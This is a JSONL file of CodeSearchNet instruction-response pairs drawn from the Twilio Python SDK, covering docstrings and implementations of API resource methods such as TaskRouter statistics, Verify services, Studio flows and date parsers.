{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, callback_method=values.unset, callback_url=values.unset,\n               friendly_name=values.unset):\n        \"\"\"\n        Update the TriggerInstance\n\n        :param unicode callback_method: The HTTP method to use to call callback_url\n        :param unicode callback_url: The URL we call when the trigger fires\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated TriggerInstance\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerInstance\n        \"\"\"\n        return self._proxy.update(\n            callback_method=callback_method,\n            callback_url=callback_url,\n            friendly_name=friendly_name,\n        )", "response": "Update the TriggerInstance\n\n        :param unicode callback_method: The HTTP method to use to call callback_url\n        :param unicode callback_url: The URL we call when the trigger fires\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated TriggerInstance\n        :rtype: twilio.rest.api.v2010.account.usage.trigger.TriggerInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of WorkspaceCumulativeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkspaceCumulativeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsInstance\n        \"\"\"\n        return WorkspaceCumulativeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkspaceCumulativeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new ServiceInstance object for a verification service.", "response": "def create(self, friendly_name, code_length=values.unset,\n               lookup_enabled=values.unset, skip_sms_to_landlines=values.unset,\n               dtmf_input_required=values.unset, tts_name=values.unset,\n               psd2_enabled=values.unset):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode friendly_name: A string to describe the verification service\n        :param unicode code_length: The length of the verification code to generate\n        :param bool lookup_enabled: Whether to perform a lookup with each verification\n        :param bool skip_sms_to_landlines: Whether to skip sending SMS verifications to landlines\n        :param bool dtmf_input_required: Whether to ask the user to press a number before delivering the verify code in a phone call\n        :param unicode tts_name: The name of an alternative text-to-speech service to use in phone calls\n        :param bool psd2_enabled: Whether to pass PSD2 transaction parameters when starting a verification\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.verify.v2.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'CodeLength': code_length,\n            'LookupEnabled': lookup_enabled,\n            'SkipSmsToLandlines': skip_sms_to_landlines,\n            'DtmfInputRequired': dtmf_input_required,\n            'TtsName': tts_name,\n            'Psd2Enabled': psd2_enabled,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, friendly_name=values.unset, code_length=values.unset,\n               lookup_enabled=values.unset, skip_sms_to_landlines=values.unset,\n               dtmf_input_required=values.unset, tts_name=values.unset,\n               psd2_enabled=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the verification service\n        :param unicode code_length: The length of the verification code to generate\n        :param bool lookup_enabled: Whether to perform a lookup with each verification\n        :param bool skip_sms_to_landlines: Whether to skip sending SMS verifications to landlines\n        :param bool dtmf_input_required: Whether to ask the user to press a number before delivering the verify code in a phone call\n        :param unicode tts_name: The name of an alternative text-to-speech service to use in phone calls\n        :param bool psd2_enabled: Whether to pass PSD2 transaction parameters when starting a verification\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.verify.v2.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            code_length=code_length,\n            lookup_enabled=lookup_enabled,\n            skip_sms_to_landlines=skip_sms_to_landlines,\n            dtmf_input_required=dtmf_input_required,\n            tts_name=tts_name,\n            psd2_enabled=psd2_enabled,\n        )", "response": "Update the ServiceInstance object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse an ISO 8601 - formatted date string and returns a UTC date object or the string s argument if the parsing fails.", "response": "def iso8601_date(s):\n    \"\"\"\n    Parses an ISO 8601 date string and returns a UTC date object or the string\n    if the parsing failed.\n    :param s: ISO 8601-formatted date string (2015-01-25)\n    :return:\n    \"\"\"\n    try:\n        return datetime.datetime.strptime(s, ISO8601_DATE_FORMAT).replace(tzinfo=pytz.utc).date()\n    except (TypeError, ValueError):\n        return s"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef iso8601_datetime(s):\n    try:\n        return datetime.datetime.strptime(s, ISO8601_DATETIME_FORMAT).replace(tzinfo=pytz.utc)\n    except (TypeError, ValueError):\n        return s", "response": "Parses an ISO 8601 - formatted datetime string and returns a UTC datetime object or the string."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef rfc2822_datetime(s):\n    date_tuple = parsedate(s)\n    if date_tuple is None:\n        return None\n    return datetime.datetime(*date_tuple[:6]).replace(tzinfo=pytz.utc)", "response": "Parses an RFC 2822 date string and returns a UTC datetime object or the string s if parsing failed."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, data, ttl=values.unset, item_ttl=values.unset,\n               collection_ttl=values.unset):\n        \"\"\"\n        Create a new SyncListItemInstance\n\n        :param dict data: Contains arbitrary user-defined, schema-less data that this List Item stores, represented by a JSON object, up to 16KB.\n        :param unicode ttl: Alias for item_ttl\n        :param unicode item_ttl: Time-to-live of this item in seconds, defaults to no expiration.\n        :param unicode collection_ttl: Time-to-live of this item's parent List in seconds, defaults to no expiration.\n\n        :returns: Newly created SyncListItemInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.sync_list_item.SyncListItemInstance\n        \"\"\"\n        data = values.of({\n            'Data': serialize.object(data),\n            'Ttl': ttl,\n            'ItemTtl': item_ttl,\n            'CollectionTtl': collection_ttl,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncListItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n        )", "response": "Create a new SyncListItemInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return AssignedAddOnExtensionContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n            assigned_add_on_sid=self._solution['assigned_add_on_sid'],\n            sid=sid,\n        )", "response": "Constructs a AssignedAddOnExtensionContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionContext\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return AssignedAddOnExtensionInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n            assigned_add_on_sid=self._solution['assigned_add_on_sid'],\n        )", "response": "Build an instance of AssignedAddOnExtensionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = AssignedAddOnExtensionContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                resource_sid=self._solution['resource_sid'],\n                assigned_add_on_sid=self._solution['assigned_add_on_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the assigned_add_on_extension"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return HighriskSpecialPrefixInstance(self._version, payload, iso_code=self._solution['iso_code'], )", "response": "Build an instance of HighriskSpecialPrefixInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a new VerificationInstance", "response": "def create(self, to, channel, custom_message=values.unset):\n        \"\"\"\n        Create a new VerificationInstance\n\n        :param unicode to: To phonenumber\n        :param unicode channel: sms or call\n        :param unicode custom_message: A custom message for this verification\n\n        :returns: Newly created VerificationInstance\n        :rtype: twilio.rest.preview.acc_security.service.verification.VerificationInstance\n        \"\"\"\n        data = values.of({'To': to, 'Channel': channel, 'CustomMessage': custom_message, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VerificationInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: RatePlanContext for this RatePlanInstance\n        :rtype: twilio.rest.preview.wireless.rate_plan.RatePlanContext\n        \"\"\"\n        if self._context is None:\n            self._context = RatePlanContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the domains :returns: twilio.rest.api.v2010.account.sip.domain.DomainList :rtype: twilio.rest.api.v2010.account.sip.domain.DomainList", "response": "def domains(self):\n        \"\"\"\n        Access the domains\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.DomainList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.DomainList\n        \"\"\"\n        if self._domains is None:\n            self._domains = DomainList(self._version, account_sid=self._solution['account_sid'], )\n        return self._domains"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the ip_access_control_lists :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListList :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListList", "response": "def ip_access_control_lists(self):\n        \"\"\"\n        Access the ip_access_control_lists\n\n        :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListList\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListList\n        \"\"\"\n        if self._ip_access_control_lists is None:\n            self._ip_access_control_lists = IpAccessControlListList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n            )\n        return self._ip_access_control_lists"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef credential_lists(self):\n        if self._credential_lists is None:\n            self._credential_lists = CredentialListList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n            )\n        return self._credential_lists", "response": "Access the credential_lists\n\n        :returns: twilio.rest.api.v2010.account.sip.credential_list.CredentialListList\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.CredentialListList"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return SipInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of SipInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nstream TaskQueuesStatisticsInstance records from the Task Queue API as a generator.", "response": "def stream(self, end_date=values.unset, friendly_name=values.unset,\n               minutes=values.unset, start_date=values.unset,\n               task_channel=values.unset, split_by_wait_time=values.unset,\n               limit=None, page_size=None):\n        \"\"\"\n        Streams TaskQueuesStatisticsInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param datetime end_date: Filter cumulative statistics by an end date.\n        :param unicode friendly_name: Filter the TaskQueue stats based on a TaskQueue's name\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param unicode task_channel: Filter real-time and cumulative statistics by TaskChannel.\n        :param unicode split_by_wait_time: A comma separated values for viewing splits of tasks canceled and accepted above the given threshold in seconds.\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.task_queue.task_queues_statistics.TaskQueuesStatisticsInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            end_date=end_date,\n            friendly_name=friendly_name,\n            minutes=minutes,\n            start_date=start_date,\n            task_channel=task_channel,\n            split_by_wait_time=split_by_wait_time,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list(self, end_date=values.unset, friendly_name=values.unset,\n             minutes=values.unset, start_date=values.unset,\n             task_channel=values.unset, split_by_wait_time=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists TaskQueuesStatisticsInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime end_date: Filter cumulative statistics by an end date.\n        :param unicode friendly_name: Filter the TaskQueue stats based on a TaskQueue's name\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param unicode task_channel: Filter real-time and cumulative statistics by TaskChannel.\n        :param unicode split_by_wait_time: A comma separated values for viewing splits of tasks canceled and accepted above the given threshold in seconds.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.task_queue.task_queues_statistics.TaskQueuesStatisticsInstance]\n        \"\"\"\n        return list(self.stream(\n            end_date=end_date,\n            friendly_name=friendly_name,\n            minutes=minutes,\n            start_date=start_date,\n            task_channel=task_channel,\n            split_by_wait_time=split_by_wait_time,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Returns a list of TaskQueuesStatisticsInstance records from the Task Queue API."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef page(self, end_date=values.unset, friendly_name=values.unset,\n             minutes=values.unset, start_date=values.unset,\n             task_channel=values.unset, split_by_wait_time=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of TaskQueuesStatisticsInstance records from the API.\n        Request is executed immediately\n\n        :param datetime end_date: Filter cumulative statistics by an end date.\n        :param unicode friendly_name: Filter the TaskQueue stats based on a TaskQueue's name\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param unicode task_channel: Filter real-time and cumulative statistics by TaskChannel.\n        :param unicode split_by_wait_time: A comma separated values for viewing splits of tasks canceled and accepted above the given threshold in seconds.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of TaskQueuesStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queues_statistics.TaskQueuesStatisticsPage\n        \"\"\"\n        params = values.of({\n            'EndDate': serialize.iso8601_datetime(end_date),\n            'FriendlyName': friendly_name,\n            'Minutes': minutes,\n            'StartDate': serialize.iso8601_datetime(start_date),\n            'TaskChannel': task_channel,\n            'SplitByWaitTime': split_by_wait_time,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return TaskQueuesStatisticsPage(self._version, response, self._solution)", "response": "Retrieve a single page of TaskQueuesStatisticsInstance records from the Task Queue API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return TaskQueuesStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Build an instance of TaskQueuesStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self):\n        return EngagementContextContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n        )", "response": "Constructs a EngagementContextContext\n\n        :returns: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextContext\n        :rtype: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of EngagementContextInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of EngagementContextInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextInstance\n        \"\"\"\n        return EngagementContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return EngagementContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n        )", "response": "Fetch a EngagementContextInstance\n\n        :returns: Fetched EngagementContextInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = EngagementContextContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['engagement_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the availage of an object. This method is idempotent and will create an instance context for the instance."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self):\n        return ExecutionStepContextContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n            step_sid=self._solution['step_sid'],\n        )", "response": "Constructs a ExecutionStepContextContext\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextContext\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextContext"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of ExecutionStepContextInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ExecutionStepContextInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextInstance\n        \"\"\"\n        return ExecutionStepContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n            step_sid=self._solution['step_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExecutionStepContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n            step_sid=self._solution['step_sid'],\n        )", "response": "Fetch a ExecutionStepContextInstance\n\n        :returns: Fetched ExecutionStepContextInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.execution_step_context.ExecutionStepContextInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExecutionStepContextContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['execution_sid'],\n                step_sid=self._solution['step_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a PayloadContext :param sid: The unique string that identifies the resource to fetch :returns: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadContext :rtype: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a PayloadContext\n\n        :param sid: The unique string that identifies the resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadContext\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadContext\n        \"\"\"\n        return PayloadContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            reference_sid=self._solution['reference_sid'],\n            add_on_result_sid=self._solution['add_on_result_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an instance of PayloadInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of PayloadInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadInstance\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadInstance\n        \"\"\"\n        return PayloadInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            reference_sid=self._solution['reference_sid'],\n            add_on_result_sid=self._solution['add_on_result_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = PayloadContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                reference_sid=self._solution['reference_sid'],\n                add_on_result_sid=self._solution['add_on_result_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the engagements :returns: twilio.rest.studio.v1.flow.engagement.EngagementList :rtype: twilio.rest.studio.v1.flow.engagement.EngagementList", "response": "def engagements(self):\n        \"\"\"\n        Access the engagements\n\n        :returns: twilio.rest.studio.v1.flow.engagement.EngagementList\n        :rtype: twilio.rest.studio.v1.flow.engagement.EngagementList\n        \"\"\"\n        if self._engagements is None:\n            self._engagements = EngagementList(self._version, flow_sid=self._solution['sid'], )\n        return self._engagements"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef executions(self):\n        if self._executions is None:\n            self._executions = ExecutionList(self._version, flow_sid=self._solution['sid'], )\n        return self._executions", "response": "Access the executions\n\n        :returns: twilio.rest.studio.v1.flow.execution.ExecutionList\n        :rtype: twilio.rest.studio.v1.flow.execution.ExecutionList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = FlowContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new QueryInstance", "response": "def create(self, language, query, tasks=values.unset, model_build=values.unset,\n               field=values.unset):\n        \"\"\"\n        Create a new QueryInstance\n\n        :param unicode language: An ISO language-country string of the sample.\n        :param unicode query: A user-provided string that uniquely identifies this resource as an alternative to the sid. It can be up to 2048 characters long.\n        :param unicode tasks: Constraints the query to a set of tasks. Useful when you need to constrain the paths the user can take. Tasks should be comma separated task-unique-name-1, task-unique-name-2\n        :param unicode model_build: The Model Build Sid or unique name of the Model Build to be queried.\n        :param unicode field: Constraints the query to a given Field with an task. Useful when you know the Field you are expecting. It accepts one field in the format task-unique-name-1:field-unique-name\n\n        :returns: Newly created QueryInstance\n        :rtype: twilio.rest.preview.understand.assistant.query.QueryInstance\n        \"\"\"\n        data = values.of({\n            'Language': language,\n            'Query': query,\n            'Tasks': tasks,\n            'ModelBuild': model_build,\n            'Field': field,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return QueryInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, friendly_name, aws_credentials_sid=values.unset,\n               encryption_key_sid=values.unset, aws_s3_url=values.unset,\n               aws_storage_enabled=values.unset, encryption_enabled=values.unset):\n        \"\"\"\n        Create a new RecordingSettingsInstance\n\n        :param unicode friendly_name: Friendly name of the configuration to be shown in the console\n        :param unicode aws_credentials_sid: SID of the Stored Credential resource CRxx\n        :param unicode encryption_key_sid: SID of the Public Key resource CRxx\n        :param unicode aws_s3_url: Identity of the external location where the recordings should be stored. We only support DNS-compliant URLs like http://<my-bucket>.s3-<aws-region>.amazonaws.com/recordings, where recordings is the path where you want recordings to be stored.\n        :param bool aws_storage_enabled: true|false When set to true, all Recordings will be written to the AwsS3Url specified above. When set to false, all Recordings will be stored in Twilio's cloud.\n        :param bool encryption_enabled: true|false When set to true, all Recordings will be stored encrypted.\n\n        :returns: Newly created RecordingSettingsInstance\n        :rtype: twilio.rest.video.v1.recording_settings.RecordingSettingsInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'AwsCredentialsSid': aws_credentials_sid,\n            'EncryptionKeySid': encryption_key_sid,\n            'AwsS3Url': aws_s3_url,\n            'AwsStorageEnabled': aws_storage_enabled,\n            'EncryptionEnabled': encryption_enabled,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RecordingSettingsInstance(self._version, payload, )", "response": "Create a new RecordingSettingsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an instance context for the recording_settings_instance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: RecordingSettingsContext for this RecordingSettingsInstance\n        :rtype: twilio.rest.video.v1.recording_settings.RecordingSettingsContext\n        \"\"\"\n        if self._context is None:\n            self._context = RecordingSettingsContext(self._version, )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new RecordingSettingsInstance", "response": "def create(self, friendly_name, aws_credentials_sid=values.unset,\n               encryption_key_sid=values.unset, aws_s3_url=values.unset,\n               aws_storage_enabled=values.unset, encryption_enabled=values.unset):\n        \"\"\"\n        Create a new RecordingSettingsInstance\n\n        :param unicode friendly_name: Friendly name of the configuration to be shown in the console\n        :param unicode aws_credentials_sid: SID of the Stored Credential resource CRxx\n        :param unicode encryption_key_sid: SID of the Public Key resource CRxx\n        :param unicode aws_s3_url: Identity of the external location where the recordings should be stored. We only support DNS-compliant URLs like http://<my-bucket>.s3-<aws-region>.amazonaws.com/recordings, where recordings is the path where you want recordings to be stored.\n        :param bool aws_storage_enabled: true|false When set to true, all Recordings will be written to the AwsS3Url specified above. When set to false, all Recordings will be stored in Twilio's cloud.\n        :param bool encryption_enabled: true|false When set to true, all Recordings will be stored encrypted.\n\n        :returns: Newly created RecordingSettingsInstance\n        :rtype: twilio.rest.video.v1.recording_settings.RecordingSettingsInstance\n        \"\"\"\n        return self._proxy.create(\n            friendly_name,\n            aws_credentials_sid=aws_credentials_sid,\n            encryption_key_sid=encryption_key_sid,\n            aws_s3_url=aws_s3_url,\n            aws_storage_enabled=aws_storage_enabled,\n            encryption_enabled=encryption_enabled,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs a TaskQueueRealTimeStatisticsContext :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsContext :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsContext", "response": "def get(self):\n        \"\"\"\n        Constructs a TaskQueueRealTimeStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsContext\n        \"\"\"\n        return TaskQueueRealTimeStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an instance of TaskQueueRealTimeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TaskQueueRealTimeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_real_time_statistics.TaskQueueRealTimeStatisticsInstance\n        \"\"\"\n        return TaskQueueRealTimeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )"}
